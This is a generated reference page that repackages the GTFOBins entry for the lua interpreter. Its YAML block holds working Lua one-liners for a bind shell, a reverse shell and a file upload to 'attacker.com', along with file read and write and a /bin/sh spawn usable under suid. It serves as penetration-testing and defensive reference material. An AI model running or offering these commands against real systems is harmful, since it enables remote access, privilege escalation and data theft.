---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# lua

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `lua` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lua` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [lua](../../tools/linux/lua.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | lua |
| name | lua |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/lua/ |

## Preserved Source Material

```yaml
_body: ''
_name: lua
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lua
functions:
  bind-shell:
  - code: "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n  local c=s:accept();\n  while\
      \ true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n\
      \  end;c:close();f:close();'"
    comment: This requires `lua-socket` to be available.
    connector: tcp-client
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  download:
  - code: "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n  local c=s:accept();\n  local\
      \ d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"/path/to/output-file\", \"wb\");\n  f:write(d);\n  io.close(f);'"
    comment: This requires `lua-socket` to be available.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: tcp-client
  file-read:
  - code: lua -e 'local f=io.open("/path/to/input-file", "rb"); io.write(f:read("*a")); io.close(f);'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - code: lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  reverse-shell:
  - code: "lua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"attacker.com\",12345);\n  while\
      \ true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n\
      \  end;\n  f:close();t:close();'"
    comment: This requires `lua-socket` to be available.
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
    listener: tcp-server
  shell:
  - code: lua -e 'os.execute("/bin/sh")'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  upload:
  - code: "lua -e '\n  local f=io.open(\"/path/to/input-file\", \"rb\")\n  local d=f:read(\"*a\")\n  io.close(f);\n  local\
      \ s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"attacker.com\",12345);\n  t:send(d);\n  t:close();'"
    comment: This requires `lua-socket` to be available.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: tcp-server
```
